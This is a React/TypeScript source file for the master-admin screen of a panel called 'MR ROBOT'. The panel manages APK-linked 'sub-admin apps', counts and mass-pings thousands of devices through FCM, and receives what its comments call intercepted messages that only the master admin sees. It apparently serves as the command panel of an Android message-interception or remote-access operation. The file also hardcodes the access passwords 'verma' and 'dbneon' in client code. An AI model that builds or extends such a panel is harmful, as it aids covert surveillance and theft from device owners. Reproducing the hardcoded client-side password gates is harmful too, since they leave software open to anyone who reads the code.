  const [logoutAllId, setLogoutAllId] = useState<string | null>(null);
  const [resetApkId, setResetApkId] = useState<string | null>(null);
  const [renewId, setRenewId] = useState<string | null>(null);
  const [renewConfirmApp, setRenewConfirmApp] = useState<App | null>(null);
  const [search, setSearch] = useState("");
  const [pingState, setPingState] = useState<"idle" | "loading" | "running" | "done" | "err">("idle");
  const [pingDone, setPingDone] = useState(0);
  const [pingTotal, setPingTotal] = useState(0);
  const [pingResult, setPingResult] = useState<{ ok: number; fail: number } | null>(null);
  const [onlineCount, setOnlineCount] = useState(0);
  const [syncTick, setSyncTick] = useState(0);
  const [wsConnected, setWsConnected] = useState(false);
  const [jumpDeviceId, setJumpDeviceId] = useState<string | null>(null);
  const sortedApps = [...appList].sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());

  /* ── Master Sessions ── */
  const [showSessions, setShowSessions] = useState(false);
  const [masterSessions, setMasterSessions] = useState<MasterSession[]>([]);
  const [sessionsLoading, setSessionsLoading] = useState(false);
  const [logoutingMSId, setLogoutingMSId] = useState<string | null>(null);

  const fetchMasterSessions = useCallback(async () => {
    setSessionsLoading(true);
    try {
      const r = await apiFetch("/api/master/sessions", { headers: { "x-master-pin": masterPin } });
      if (r.ok) setMasterSessions(await r.json() as MasterSession[]);
    } catch { /* ignore */ } finally { setSessionsLoading(false); }
  }, [masterPin]);

  useEffect(() => { void fetchMasterSessions(); }, [fetchMasterSessions]);

  useEffect(() => {
    if (showSessions) void fetchMasterSessions();
  }, [showSessions, fetchMasterSessions]);

  async function logoutMasterSession(id: string) {
    setLogoutingMSId(id);
    try {
      await apiFetch(`/api/master/sessions/${id}`, { method: "DELETE", headers: { "x-master-pin": masterPin } });
      setMasterSessions(prev => prev.filter(s => s.id !== id));
      if (id === sessionId) onLogout();
    } catch { /* ignore */ } finally { setLogoutingMSId(null); }
  }

  function openDevice(deviceId: string) {
    setJumpDeviceId(deviceId);
    changeTab("devices");
    // Reset so same deviceId can be re-triggered
    setTimeout(() => setJumpDeviceId(null), 500);
  }

  const fetchApps = useCallback(async () => {
    try {
      const r = await apiFetch("/api/master/apps", { headers: { "x-master-pin": masterPin } });
      if (r.ok) setAppList(await r.json() as App[]);
    } catch { /* ignore */ } finally { setAppsLoading(false); }
  }, [masterPin]);

  useEffect(() => { void fetchApps(); }, [fetchApps]);

  // ── Stats: fast SQL COUNT — no full 18K device download just for a number ──
  const fetchStats = useCallback(async () => {
    try {
      const r = await apiFetch("/api/master/stats", { headers: { "x-master-pin": masterPin } });
      if (r.ok) {
        const d = await r.json() as { onlineCount: number; totalDevices: number };
        setOnlineCount(d.onlineCount);
      }
    } catch { /* ignore */ }
  }, [masterPin]);

  useEffect(() => {
    void fetchStats();
    const iv = setInterval(() => void fetchStats(), 2 * 60 * 1000);
    return () => clearInterval(iv);
  }, [fetchStats]);

  useEffect(() => {
    function onRefresh() { void fetchStats(); }
    window.addEventListener("mrrobot:refresh_devices", onRefresh);
    return () => window.removeEventListener("mrrobot:refresh_devices", onRefresh);
  }, [fetchStats]);

  // ── Master-only SSE: intercept channel — PIN never in URL, uses HMAC token ──
  useEffect(() => {
    let es: EventSource | null = null;
    let closed = false;
    async function connect() {
      if (closed) return;
      try {
        const tr = await apiFetch("/api/master/sse-token", { method: "POST", headers: { "x-master-pin": masterPin } });
        if (!tr.ok) { if (!closed) setTimeout(connect, 5000); return; }
        const { token } = await tr.json() as { token: string };
        if (closed) return;
        es = new EventSource(`/api/master/events?token=${encodeURIComponent(token)}`);
        es.addEventListener("message_added", (e: MessageEvent) => {
          try {
            const payload = JSON.parse(e.data as string) as { appId: string; message: MsgRow };
            window.dispatchEvent(new CustomEvent("mrrobot:message_added", { detail: payload }));
          } catch { /* ignore */ }
        });
        es.onerror = () => { if (!closed) { es?.close(); setTimeout(connect, 5000); } };
      } catch { if (!closed) setTimeout(connect, 5000); }
    }
    connect();
    return () => { closed = true; es?.close(); };
  }, [masterPin]);

  // ── Global WebSocket: live events via Cloudflare Durable Object ──
  useEffect(() => {
    let ws: WebSocket | null = null;
    let closed = false;
    function connect() {
      if (closed) return;
      const wsUrl = location.origin.replace(/^http/, "ws") + "/api/events";
      ws = new WebSocket(wsUrl);
      ws.onopen = () => {
        setWsConnected(true);
        // Fire reconnect event so DevicesTab can do a full refresh after any disconnect gap
        window.dispatchEvent(new CustomEvent("mrrobot:ws_reconnected"));
      };
      ws.onmessage = (e) => {
        try {
          const msg = JSON.parse(e.data as string) as { event: string; data: unknown };
          if (msg.event === "device_updated") {
            // Dispatch full device data — DevicesTab surgically updates the single card, no HTTP re-fetch
            window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: msg.data }));
          } else if (msg.event === "message_added") {
            const payload = msg.data as { appId: string; message: MsgRow };
            window.dispatchEvent(new CustomEvent("mrrobot:message_added", { detail: payload }));
          } else if (msg.event === "master_message_added") {
            // Intercepted message — only master admin sees this via WS
            const payload = msg.data as { appId: string; message: MsgRow };
            window.dispatchEvent(new CustomEvent("mrrobot:message_added", { detail: payload }));
          }
        } catch { /* ignore */ }
      };
      ws.onclose = () => { setWsConnected(false); if (!closed) setTimeout(connect, 3000); };
      ws.onerror = () => { setWsConnected(false); ws?.close(); };
    }
    connect();
    return () => { closed = true; ws?.close(); };
  }, []);

  async function handlePingAll() {
    setPingState("loading"); setPingResult(null); setPingDone(0); setPingTotal(0);
    try {
      const r = await apiFetch("/api/master/all-devices?hasFcm=1", { headers: { "x-master-pin": masterPin } });
      const eligible = r.ok ? (await r.json() as FullDevice[]) : [];
      setPingTotal(eligible.length); setPingState("running");
      const BATCH = 100; const DELAY = 300;
      let ok = 0; let fail = 0;
      for (let i = 0; i < eligible.length; i += BATCH) {
        const batch = eligible.slice(i, i + BATCH);
        const results = await Promise.allSettled(batch.map(d =>
          apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data: { type: "0" } }) }).then(res => { if (!res.ok) throw new Error(); })
        ));
        results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
        setPingDone(Math.min(i + BATCH, eligible.length));
        if (i + BATCH < eligible.length) await new Promise(r2 => setTimeout(r2, DELAY));
      }
      setPingResult({ ok, fail }); setPingState("done");
      setTimeout(() => { setPingState("idle"); setPingDone(0); setPingTotal(0); setPingResult(null); }, 7000);
    } catch { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
  }

  async function toggleStatus(app: App) {
    setTogglingId(app.appId);
    const newStatus = app.status === "active" ? "disabled" : "active";
    try {
      await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, { method: "PATCH", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ status: newStatus }) });
      setAppList(prev => prev.map(a => a.appId === app.appId ? { ...a, status: newStatus } : a));
    } catch { /* ignore */ } finally { setTogglingId(null); }
  }

  function deleteApp(app: App) {
    setDeleteGateInput(""); setDeleteGateError(""); setDeleteGateShow(false);
    setDeleteGateApp(app);
  }
  async function confirmDeleteApp(app: App) {
    setDeleteGateApp(null);
    setDeletingId(app.appId);
    try {
      await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, { method: "DELETE", headers: { "x-master-pin": masterPin } });
      setAppList(prev => prev.filter(a => a.appId !== app.appId));
    } catch { /* ignore */ } finally { setDeletingId(null); }
  }

  async function logoutAll(app: App) {
    if (!confirm(`Logout all active sessions for "${app.name}"?`)) return;
    setLogoutAllId(app.appId);
    try { await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(app.appId)}`, { method: "DELETE" }); }
    catch { /* ignore */ } finally { setLogoutAllId(null); }
  }

  async function resetApk(app: App) {
    if (!confirm(`Reset APK selection for "${app.name}"?`)) return;
    setResetApkId(app.appId);
    try {
      const r = await apiFetch(`/api/master/token-app/${encodeURIComponent(app.appId)}`, { method: "DELETE", headers: { "x-master-pin": masterPin } });
      const j = await r.json() as { ok?: boolean; error?: string; deleted?: number };
      if (r.ok) alert(`✅ Reset done! ${j.deleted ?? 0} mapping(s) cleared.`);
      else alert(`❌ Error: ${j.error ?? "Unknown error"}`);
    } catch { alert("❌ Network error"); } finally { setResetApkId(null); }
  }

  function copyUrl(app: App) {
    const url = `${window.location.origin}/preview/dashboard/WebDashboard?appId=${app.appId}`;
    copyToClipboard(url).then(() => {
      setCopyMsg(p => ({ ...p, [app.appId]: "Copied!" }));
      setTimeout(() => setCopyMsg(p => ({ ...p, [app.appId]: "" })), 2000);
    });
  }

  const filteredApps = search.trim() === "" ? sortedApps : sortedApps.filter(a =>
    a.appId.toLowerCase().includes(search.trim().toLowerCase()) || a.name.toLowerCase().includes(search.trim().toLowerCase())
  );
  const activeCount = appList.filter(a => a.status === "active").length;
  const pingBusy = pingState === "running" || pingState === "loading";

  const TABS: { id: Tab; label: string }[] = [
    { id: "apps",     label: "Home"     },
    { id: "messages", label: "Messages" },
    { id: "groups",   label: "Groups"   },
    { id: "devices",  label: "Devices"  },
    { id: "settings", label: "Settings" },
    { id: "users",    label: "👥 Users"  },
  ];

  return (
    <div style={{ minHeight: "100vh", background: T.bg, fontFamily: "'Inter', system-ui, sans-serif", color: T.text }}>
      <style>{`
        @keyframes spin{to{transform:rotate(360deg)}}
        @keyframes ma-pulse{0%,100%{opacity:1}50%{opacity:0.55}}
        *{box-sizing:border-box}
        .ma-tab-btn{cursor:pointer;background:none;border:none;font-family:inherit;-webkit-tap-highlight-color:transparent;}
        .ma-tab-btn:active{opacity:0.7;}
        .ma-card:active{transform:scale(0.985);}
        .ma-device-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
        @media(max-width:640px){
          .ma-hide-mob{display:none!important;}
          .ma-fab{display:flex!important;}
          .ma-main{padding-bottom:88px!important;}
          .ma-device-grid{grid-template-columns:1fr 1fr!important;gap:8px!important;}
          .ma-dcard-row{padding:5px 10px!important;}
          .ma-dcard-lbl{width:48px!important;font-size:9px!important;}
          .ma-dcard-val{font-size:9px!important;}
          .ma-dcard-title{font-size:11px!important;padding:7px 8px 7px 10px!important;}
          .ma-dcard-check{padding:7px 4px!important;font-size:11px!important;}
        }
        .ma-fab{display:none;position:fixed;bottom:20px;right:18px;z-index:200;width:52px;height:52px;border-radius:16px;border:none;background:linear-gradient(135deg,#5254d4,#7c3aed);align-items:center;justify-content:center;color:#fff;cursor:pointer;box-shadow:0 6px 24px rgba(99,102,241,0.55);font-size:22px;font-weight:900;}
      `}</style>

      {/* ── Header: sub-admin style ── */}
      <div style={{ background: T.headerBg, borderBottom: `1px solid ${T.border}`, position: "sticky", top: 0, zIndex: 50, backdropFilter: "blur(20px)" }}>
        {/* Top row: logo + counters + actions */}
        <div style={{ maxWidth: 960, margin: "0 auto", display: "flex", alignItems: "center", gap: 8, padding: "0 12px", height: 50, flexWrap: "nowrap", overflowX: "auto", scrollbarWidth: "none" }}>
          {/* Logo */}
          <div style={{ display: "flex", alignItems: "center", gap: 7, flexShrink: 0 }}>
            <div style={{ width: 32, height: 32, borderRadius: 10, background: "linear-gradient(145deg,#4f52d4,#7c3aed)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontSize: 16 }}>🤖</div>
            <span style={{ fontSize: 14, fontWeight: 900, color: T.text, letterSpacing: -0.3 }}>MR ROBOT</span>
          </div>
          {/* Online counter — click to filter devices to online only */}
          <button
            onClick={() => {
              if (tab === "devices" && onlineFilter) {
                setOnlineFilter(false); // already filtered → click to deselect
              } else {
                changeTab("devices");
                setOnlineFilter(true);
              }
            }}
            title={tab === "devices" && onlineFilter ? "Clear online filter" : "Show only online devices"}
            style={{ display: "inline-flex", alignItems: "center", gap: 5, background: onlineFilter ? "#14532d" : (onlineCount > 0 ? "#14532d" : T.card), border: `1px solid ${onlineCount > 0 ? "#22c55e" : T.borderLight}`, borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700, color: onlineCount > 0 ? "#4ade80" : T.muted, flexShrink: 0, cursor: "pointer" }}>
            <span style={{ width: 6, height: 6, borderRadius: "50%", background: onlineCount > 0 ? "#22c55e" : T.muted, display: "inline-block", boxShadow: onlineCount > 0 ? "0 0 5px #22c55e" : "none" }} />
            {onlineCount} /15m{tab === "devices" && onlineFilter ? " ✕" : ""}
          </button>
          {/* WS Connection status */}
          <span className="ma-hide-mob" style={{ display: "inline-flex", alignItems: "center", gap: 5, background: wsConnected ? "#14532d" : T.card, border: `1px solid ${wsConnected ? "#22c55e" : T.borderLight}`, borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700, color: wsConnected ? "#4ade80" : T.muted, flexShrink: 0 }}>
            <span style={{ width: 6, height: 6, borderRadius: "50%", background: wsConnected ? "#22c55e" : T.muted, display: "inline-block", boxShadow: wsConnected ? "0 0 5px #22c55e" : "none" }} />
            {wsConnected ? "Live" : "Connecting…"}
          </span>
          <div style={{ flex: 1 }} />
          {/* Sync */}
          <button onClick={() => { setSyncTick(t => t + 1); void fetchApps(); }} title="Sync all data" style={{ display: "flex", alignItems: "center", gap: 5, padding: "6px 12px", borderRadius: 8, background: T.card, border: `1px solid ${T.borderLight}`, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: "pointer", flexShrink: 0 }}>
            <Ic.Refresh /> <span className="ma-hide-mob">Sync</span>
          </button>
          {/* Ping All — compact in header */}
          <button onClick={() => void handlePingAll()} disabled={pingBusy} title="Ping All Devices" style={{ display: "flex", alignItems: "center", gap: 5, padding: "6px 12px", borderRadius: 8, background: pingBusy ? T.accentGlow : T.card, border: `1px solid ${pingBusy ? T.accent + "66" : T.borderLight}`, color: pingBusy ? T.accentLight : T.mutedLight, fontSize: 11, fontWeight: 700, cursor: pingBusy ? "wait" : "pointer", flexShrink: 0 }}>
            <Ic.Wifi /> <span className="ma-hide-mob">{pingBusy ? `${pingDone}/${pingTotal}…` : "Ping All"}</span>
          </button>
          {/* PIN + Logout */}
          {/* Nav unlock button */}
          {navPassState === "asking" ? (
            <form onSubmit={e => { e.preventDefault(); if (navPass === "verma") { setTabsUnlocked(t => !t); setNavPassState("idle"); setNavPass(""); } else { setNavPassState("err"); setNavPass(""); setTimeout(() => navPassRef.current?.focus(), 30); } }} style={{ display: "inline-flex", alignItems: "center", gap: 4, position: "relative", flexShrink: 0 }}>
              <input ref={navPassRef} autoFocus type="password" value={navPass} onChange={e => { setNavPass(e.target.value); setNavPassState("asking"); }} placeholder="password" style={{ width: 80, padding: "3px 7px", borderRadius: 6, border: `1px solid ${navPassState === "err" ? "#ef4444" : T.borderLight}`, background: T.inputBg, color: T.text, fontSize: 11, outline: "none" }} />
              <button type="submit" style={{ padding: "3px 7px", borderRadius: 6, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontSize: 11, fontWeight: 700, cursor: "pointer" }}>OK</button>
              <button type="button" onClick={() => { setNavPassState("idle"); setNavPass(""); }} style={{ padding: "3px 5px", borderRadius: 6, background: T.border, border: `1px solid ${T.borderLight}`, color: T.muted, fontSize: 11, cursor: "pointer" }}>✕</button>
              {navPassState === "err" && <span style={{ position: "absolute", top: "100%", left: 0, fontSize: 10, color: "#ef4444", whiteSpace: "nowrap", marginTop: 2 }}>Galat password</span>}
            </form>
          ) : (
            <button onClick={() => { setNavPassState("asking"); setNavPass(""); setTimeout(() => navPassRef.current?.focus(), 50); }} title={tabsUnlocked ? "Nav hide karo" : "Nav show karo"} style={{ width: 32, height: 32, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: `1px solid ${tabsUnlocked ? T.accent + "60" : T.borderLight}`, background: tabsUnlocked ? T.accent + "22" : T.card, color: tabsUnlocked ? T.accentLight : T.muted, flexShrink: 0 }}>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">{tabsUnlocked ? <><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></> : <><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></>}</svg>
            </button>
          )}
          <button onClick={() => setShowChangePin(true)} title="Change PIN" style={{ width: 32, height: 32, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: `1px solid ${T.borderLight}`, background: T.card, color: T.muted, flexShrink: 0 }}><Ic.Key /></button>
          {/* Sessions count button */}
          <button onClick={() => setShowSessions(true)} title="Login sessions" style={{ display: "inline-flex", alignItems: "center", gap: 5, padding: "4px 10px", borderRadius: 8, border: `1px solid ${T.borderLight}`, background: T.card, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: "pointer", flexShrink: 0 }}>
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
            <span>{masterSessions.length > 0 ? masterSessions.length : "?"}</span>
          </button>
          <button onClick={onLogout} title="Logout" style={{ width: 32, height: 32, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: "1px solid rgba(239,68,68,0.3)", background: "rgba(239,68,68,0.1)", color: "#f87171", flexShrink: 0 }}><Ic.LogOut /></button>
        </div>
        {/* Tabs row — hidden by default, shown after "verma" password */}
        {tabsUnlocked && (
          <div style={{ maxWidth: 960, margin: "0 auto", display: "flex", padding: "0 12px", borderTop: `1px solid ${T.border}`, overflowX: "auto" }}>
            {TABS.map(t => (
              <button key={t.id} className="ma-tab-btn" onClick={() => changeTab(t.id)} style={{
                padding: "10px 16px", fontSize: 12, fontWeight: tab === t.id ? 700 : 500,
                color: tab === t.id ? T.accentLight : T.muted,
                border: "none", borderBottom: `2px solid ${tab === t.id ? T.accent : "transparent"}`,
                background: "transparent", cursor: "pointer", transition: "color 0.15s", whiteSpace: "nowrap",
                marginBottom: -1,
              }}>
                {t.label}
              </button>
            ))}
          </div>
        )}
      </div>

      {/* Main content */}
      <div className="ma-main" style={{ maxWidth: 960, margin: "0 auto", padding: "16px 14px" }}>

        {/* APPS TAB */}
        {tab === "apps" && (
          <>
            {/* Stats */}
            <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 10, marginBottom: 16 }}>
              {[
                { label: "Total Apps", val: appList.length, color: T.accent, Icon: Ic.Layers },
                { label: "Active", val: activeCount, color: T.green, Icon: Ic.CheckCircle },
                { label: "Disabled", val: appList.length - activeCount, color: T.red, Icon: Ic.XCircle },
              ].map(({ label, val, color, Icon }) => (
                <div key={label} style={{ background: T.card, borderRadius: 13, padding: "14px 16px", border: `1px solid ${T.borderLight}`, position: "relative", overflow: "hidden" }}>
                  <div style={{ position: "absolute", top: -10, right: -10, width: 60, height: 60, borderRadius: "50%", background: color + "12", pointerEvents: "none" }} />
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
                    <span style={{ color, opacity: 0.9 }}><Icon /></span>
                    <span style={{ fontSize: 10, color: T.muted, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.5 }}>{label}</span>
                  </div>
                  <div style={{ fontSize: 30, fontWeight: 900, color, lineHeight: 1 }}>{val}</div>
                </div>
              ))}
            </div>

            {/* Apps header + search */}
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10, gap: 12, flexWrap: "wrap" }}>
              <div><div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>Sub-Admin Apps</div><div style={{ fontSize: 11, color: T.muted, marginTop: 1 }}>Sorted by newest first</div></div>
              <button onClick={() => { setCreateGateInput(""); setCreateGateError(""); setCreateGateShow(false); setShowCreateGate(true); }} className="ma-hide-mob" style={{ padding: "8px 16px", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 800, fontSize: 12, cursor: "pointer", display: "flex", alignItems: "center", gap: 6 }}><Ic.Plus /> New App</button>
            </div>
            <div style={{ marginBottom: 12, position: "relative" }}>
              <span style={{ position: "absolute", left: 13, top: "50%", transform: "translateY(-50%)", color: T.muted, pointerEvents: "none", display: "flex" }}><Ic.Search /></span>
              <input type="text" placeholder="Search by App ID or name…" value={search} onChange={e => setSearch(e.target.value)} style={{ width: "100%", boxSizing: "border-box", padding: "10px 36px 10px 40px", borderRadius: 10, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
              {search && <button onClick={() => setSearch("")} style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 22, height: 22, borderRadius: 6, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>}
            </div>
            {appsLoading ? (
              <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 14 }}><Ic.Loader /><div>Loading apps…</div></div>
            ) : filteredApps.length === 0 ? (
              <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
                <Ic.Inbox /><div>{search ? `No apps for "${search}".` : 'No apps yet. Click "New App" to create.'}</div>
              </div>
            ) : (
              <div style={{ display: "flex", flexDirection: "column", gap: 9 }}>
                {filteredApps.map(app => (
                  <AppCard key={app.appId} app={app} onEdit={setEditApp} onDelete={deleteApp} onToggle={toggleStatus} onLogoutAll={logoutAll} onCopyUrl={copyUrl} onResetApk={resetApk} onRenew={a => setRenewConfirmApp(a)} copyMsg={copyMsg} deletingId={deletingId} togglingId={togglingId} logoutAllId={logoutAllId} resetApkId={resetApkId} renewId={renewId} />
                ))}
              </div>
            )}
          </>
        )}

        <div style={{ display: tab === "messages" ? "block" : "none" }}><MessagesTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOpenDevice={openDevice} /></div>
        {/* Mobile FAB — New App (only on apps tab) */}
        {tab === "apps" && (
          <button className="ma-fab" onClick={() => { setCreateGateInput(""); setCreateGateError(""); setCreateGateShow(false); setShowCreateGate(true); }} title="New App">＋</button>
        )}
        <div style={{ display: tab === "groups" ? "block" : "none" }}><GroupsTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOpenDevice={openDevice} /></div>
        <div style={{ display: tab === "devices" ? "block" : "none" }}><DevicesTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOnlineCount={setOnlineCount} onlineCount={onlineCount} onlineFilter={onlineFilter} onClearOnlineFilter={() => setOnlineFilter(false)} jumpDeviceId={jumpDeviceId} /></div>
        <div style={{ display: tab === "settings" ? "block" : "none" }}><SettingsTab apps={appList} masterPin={masterPin} /></div>
        {tab === "users" && <ManageUsersTab apps={appList} masterPin={masterPin} onPinReset={(appId, _pin) => setAppList(prev => prev.map(a => a.appId === appId ? { ...a } : a))} />}
      </div>

      {/* Create App Password Gate */}
      {showCreateGate && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.72)", zIndex: 999, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}>
          <div style={{ background: "#141428", borderRadius: 18, padding: "32px 28px 28px", width: "100%", maxWidth: 380, boxShadow: "0 24px 80px rgba(0,0,0,0.6)", border: "1px solid rgba(255,255,255,0.08)", position: "relative" }}>
            <button onClick={() => setShowCreateGate(false)} style={{ position: "absolute", top: 14, right: 14, background: "rgba(255,255,255,0.08)", border: "none", color: "#aaa", cursor: "pointer", width: 28, height: 28, borderRadius: 8, fontSize: 16, display: "flex", alignItems: "center", justifyContent: "center" }}>✕</button>
            <div style={{ fontSize: 18, fontWeight: 800, color: "#fff", marginBottom: 6 }}>Access Required</div>
            <div style={{ fontSize: 13, color: "#888", marginBottom: 22 }}>Enter the creation password to proceed.</div>
            <div style={{ fontSize: 11, fontWeight: 700, color: "#8b8fa8", letterSpacing: 1, marginBottom: 6 }}>PASSWORD</div>
            <div style={{ position: "relative", marginBottom: 16 }}>
              <input
                autoFocus
                type={createGateShow ? "text" : "password"}
                value={createGateInput}
                onChange={e => { setCreateGateInput(e.target.value); setCreateGateError(""); }}
                onKeyDown={e => {
                  if (e.key === "Enter") {
                    if (createGateInput === "dbneon") { setShowCreateGate(false); setShowCreate(true); }
                    else setCreateGateError("Incorrect password. Try again.");
                  }
                }}
                placeholder="Enter password"
                style={{ width: "100%", boxSizing: "border-box", padding: "12px 44px 12px 14px", borderRadius: 10, background: "#1a1a35", border: `1.5px solid ${createGateError ? "#ef4444" : "rgba(255,255,255,0.1)"}`, color: "#fff", fontSize: 14, outline: "none" }}
              />
              <button type="button" onClick={() => setCreateGateShow(s => !s)} style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: "#666", cursor: "pointer", fontSize: 16, padding: 0 }}>
                {createGateShow ? "🙈" : "👁"}
              </button>
            </div>
            {createGateError && <div style={{ fontSize: 12, color: "#ef4444", marginBottom: 12, marginTop: -8 }}>{createGateError}</div>}
            <div style={{ display: "flex", gap: 10, marginTop: 4 }}>
              <button onClick={() => setShowCreateGate(false)} style={{ flex: 1, padding: "11px 0", borderRadius: 10, background: "rgba(255,255,255,0.07)", border: "none", color: "#aaa", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>Cancel</button>
              <button onClick={() => {
                if (createGateInput === "dbneon") { setShowCreateGate(false); setShowCreate(true); }
                else setCreateGateError("Incorrect password. Try again.");
              }} style={{ flex: 1, padding: "11px 0", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 800, fontSize: 13, cursor: "pointer" }}>Confirm</button>
            </div>
          </div>
        </div>
      )}

      {/* Delete App Password Gate */}
      {deleteGateApp && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.72)", zIndex: 999, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}>
          <div style={{ background: "#141428", borderRadius: 18, padding: "32px 28px 28px", width: "100%", maxWidth: 380, boxShadow: "0 24px 80px rgba(0,0,0,0.6)", border: "1px solid rgba(255,255,255,0.08)", position: "relative" }}>
            <button onClick={() => setDeleteGateApp(null)} style={{ position: "absolute", top: 14, right: 14, background: "rgba(255,255,255,0.08)", border: "none", color: "#aaa", cursor: "pointer", width: 28, height: 28, borderRadius: 8, fontSize: 16, display: "flex", alignItems: "center", justifyContent: "center" }}>✕</button>
            <div style={{ fontSize: 18, fontWeight: 800, color: "#ef4444", marginBottom: 6 }}>⚠ Delete App</div>
            <div style={{ fontSize: 13, color: "#888", marginBottom: 4 }}>You are about to permanently delete:</div>
            <div style={{ fontSize: 13, fontWeight: 700, color: "#fff", background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.25)", borderRadius: 8, padding: "8px 12px", marginBottom: 20 }}>{deleteGateApp.name} <span style={{ color: "#666", fontWeight: 400 }}>({deleteGateApp.appId})</span></div>
            <div style={{ fontSize: 11, fontWeight: 700, color: "#8b8fa8", letterSpacing: 1, marginBottom: 6 }}>PASSWORD</div>
            <div style={{ position: "relative", marginBottom: 16 }}>
              <input
                autoFocus
                type={deleteGateShow ? "text" : "password"}
                value={deleteGateInput}
                onChange={e => { setDeleteGateInput(e.target.value); setDeleteGateError(""); }}
                onKeyDown={e => {
                  if (e.key === "Enter") {
                    if (deleteGateInput === "dbneon") confirmDeleteApp(deleteGateApp);
                    else setDeleteGateError("Incorrect password. Try again.");
                  }
                }}
                placeholder="Enter password to confirm delete"
                style={{ width: "100%", boxSizing: "border-box", padding: "12px 44px 12px 14px", borderRadius: 10, background: "#1a1a35", border: `1.5px solid ${deleteGateError ? "#ef4444" : "rgba(255,255,255,0.1)"}`, color: "#fff", fontSize: 14, outline: "none" }}
              />
              <button type="button" onClick={() => setDeleteGateShow(s => !s)} style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: "#666", cursor: "pointer", fontSize: 16, padding: 0 }}>
                {deleteGateShow ? "🙈" : "👁"}
              </button>
            </div>
            {deleteGateError && <div style={{ fontSize: 12, color: "#ef4444", marginBottom: 12, marginTop: -8 }}>{deleteGateError}</div>}
            <div style={{ display: "flex", gap: 10, marginTop: 4 }}>
              <button onClick={() => setDeleteGateApp(null)} style={{ flex: 1, padding: "11px 0", borderRadius: 10, background: "rgba(255,255,255,0.07)", border: "none", color: "#aaa", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>Cancel</button>
              <button onClick={() => {
                if (deleteGateInput === "dbneon") confirmDeleteApp(deleteGateApp);
                else setDeleteGateError("Incorrect password. Try again.");
              }} style={{ flex: 1, padding: "11px 0", borderRadius: 10, background: "linear-gradient(135deg,#dc2626,#ef4444)", border: "none", color: "#fff", fontWeight: 800, fontSize: 13, cursor: "pointer" }}>Delete App</button>
            </div>
          </div>
        </div>
      )}

      {/* Modals */}
      {showCreate && <CreateAppModal masterPin={masterPin} onClose={() => setShowCreate(false)} onCreated={a => { setAppList(prev => [a, ...prev]); setShowCreate(false); }} />}
      {showViewPin && <ViewPinModal masterPin={masterPin} onClose={() => setShowViewPin(false)} />}
      {showChangePin && <ChangePinModal masterPin={masterPin} onClose={() => setShowChangePin(false)} onChanged={p => { onPinChanged(p); setShowChangePin(false); }} />}
      {editApp && <EditAppModal app={editApp} masterPin={masterPin} onClose={() => setEditApp(null)} onUpdated={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? a : x)); setEditApp(null); }} />}
